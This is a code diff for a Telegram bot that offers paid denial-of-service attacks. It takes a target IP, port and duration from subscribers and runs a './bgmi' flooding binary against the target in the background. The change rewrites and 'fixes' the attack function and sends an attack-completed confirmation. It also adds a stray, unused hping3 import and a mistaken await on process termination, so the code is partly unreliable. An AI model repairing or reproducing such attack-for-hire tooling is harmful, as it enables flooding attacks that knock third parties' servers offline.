@@ -149,20 +149,35 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Run attack in background
     asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
 
-async def run_attack_command_async(chat_id, target_ip, target_port, duration):
-    global attack_in_progress
-    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 10")
-    await process.communicate()
-    attack_in_progress = False
-    attack_stop_event.set()  # Signal the countdown thread to stop
-    # Notify completion
+async def run_attack(chat_id, ip, port, duration, context):
+    """Fixed attack function"""
     try:
-        bot.send_message(chat_id, "*✅ Attack Completed! ✅*\n"
-                                   "*The attack has been successfully executed.*\n"
-                                   "*Thank you for using our service!*",
-                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
+        # Method 1: Use Python hping3 (install: pip install hping3-python)
+        import hping3
+        
+        # Method 2: Use subprocess with proper error handling
+        process = await asyncio.create_subprocess_exec(
+            "./bgmi", ip, port, str(duration), "10",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        
+        # Wait for duration OR process to finish
+        await asyncio.wait_for(process.communicate(), timeout=duration+5)
+        
+    except FileNotFoundError:
+        await context.bot.send_message(chat_id, "*❌ bgmi binary not found! Contact admin.*")
+    except asyncio.TimeoutError:
+        await process.terminate()
     except Exception as e:
-        logging.error(f"Error sending completion message: {e}")
+        logger.error(f"Attack error: {e}")
+    
+    # Success message
+    await context.bot.send_message(
+        chat_id, 
+        f"*✅ Attack on {ip}:{port} completed ({duration}s)!*",
+        parse_mode='Markdown'
+    )
         
 async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Admin command to add user subscription"""
